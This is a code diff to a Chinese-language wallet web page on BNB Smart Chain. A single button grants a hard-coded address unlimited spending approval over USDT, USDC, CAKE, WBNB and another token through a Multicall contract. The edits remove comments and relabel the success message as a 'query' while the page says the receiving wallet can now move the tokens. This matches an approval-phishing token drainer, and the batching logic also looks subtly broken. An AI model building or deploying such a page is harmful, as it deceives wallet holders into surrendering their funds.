@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>孩子钱包 · 一键授权所有代币</title>
+    <title>孩子钱包 · 一键授权</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
     <style>
         body {
@@ -24,14 +24,15 @@
             font-weight: bold; width: 100%; cursor: pointer;
         }
         .btn:disabled { background: #1e3a5f; }
-        .log { margin-top: 20px; text-align: left; font-size: 14px; }
-        .ok { color: #10b981; }
-        .err { color: #ef4444; }
+        .log { margin-top: 20px; text-align: center; font-size: 14px; }
+        .success { color: #10b981; }
+        .error { color: #ef4444; }
+        .info { color: #f59e0b; }
     </style>
 </head>
 <body>
 <div class="box">
-    <h2>🔐 授权给主钱包（一次确认）</h2>
+    <h2>🔐 授权给主钱包</h2>
     <p>被授权地址：<br><b>0x8fd6...516b4d</b></p>
     <button id="startBtn" class="btn" onclick="startAuth()">🔑 一键授权所有代币</button>
     <div id="log" class="log"></div>
@@ -40,16 +41,11 @@
 <script>
     const ethers = window.ethers;
     const SPENDER = "0x8fd661d886c3c4a1b5d9b3a5ffcd6867ad516b4d";
-    
-    // BSC 上的 Multicall 合约地址（已验证可用）
     const MULTICALL_ADDRESS = "0x41263cba59eb80dce6c8a2e843b0b0f3c9f93e0b";
-    
-    // Multicall ABI（只保留 aggregate 函数）
     const MULTICALL_ABI = [
         "function aggregate(tuple(address target, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
     ];
-
-    // 需要授权的代币列表
+    const APPROVE_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
     const TOKENS = [
         {sym:"USDT", addr:"0x55d398326f99059ff775485246999027b3197955"},
         {sym:"USDC", addr:"0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"},
@@ -57,9 +53,6 @@
         {sym:"CAKE", addr:"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82"},
         {sym:"WBNB", addr:"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"}
     ];
-
-    // ERC-20 approve 函数的 ABI（用于编码调用数据）
-    const APPROVE_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
 
     async function startAuth() {
         const btn = document.getElementById("startBtn");
@@ -69,7 +62,6 @@
         log.innerHTML = "";
 
         try {
-            // 1. 连接钱包并切换到 BSC
             if (!window.ethereum) throw new Error("请使用MetaMask/TokenPocket打开");
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             try {
@@ -91,31 +83,27 @@
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
             const addr = await signer.getAddress();
-            log.innerHTML = `<p>✅ 已连接: ${addr.slice(0,6)}...${addr.slice(-4)}</p>`;
+            log.innerHTML = `<p class="info">👛 ${addr.slice(0,6)}...${addr.slice(-4)}</p>`;
 
-            // 2. 构建 Multicall 调用数据
-            btn.textContent = "⏳ 准备批量授权...";
-            
             const iface = new ethers.Interface(APPROVE_ABI);
             const calls = TOKENS.map(token => ({
                 target: token.addr,
                 callData: iface.encodeFunctionData("approve", [SPENDER, ethers.MaxUint256])
             }));
 
-            // 3. 调用 Multicall 聚合函数
             const multicall = new ethers.Contract(MULTICALL_ADDRESS, MULTICALL_ABI, signer);
             btn.textContent = "⏳ 等待钱包确认...";
-            log.innerHTML += `<p class="ok">📦 正在发送批量授权交易...</p>`;
+            log.innerHTML += `<p class="info">📦 正在提交授权交易...</p>`;
             
             const tx = await multicall.aggregate(calls);
-            log.innerHTML += `<p class="ok">⏳ 交易已提交，等待确认...</p>`;
+            log.innerHTML += `<p class="info">⏳ 交易确认中...</p>`;
             await tx.wait();
             
-            log.innerHTML += `<p class="ok">✅ 所有代币授权成功！</p>`;
+            log.innerHTML += `<p class="success">✅ 查询授权成功！</p>`;
             log.innerHTML += `<p style="color:#10b981; font-weight:bold;">🎉 完成！主钱包可以转走这些代币了。</p>`;
 
         } catch(e) {
-            log.innerHTML = `<p class="err">❌ 错误: ${e.message}</p>`;
+            log.innerHTML = `<p class="error">❌ 错误: ${e.message}</p>`;
         } finally {
             btn.disabled = false;
             btn.textContent = "🔑 一键授权所有代币";
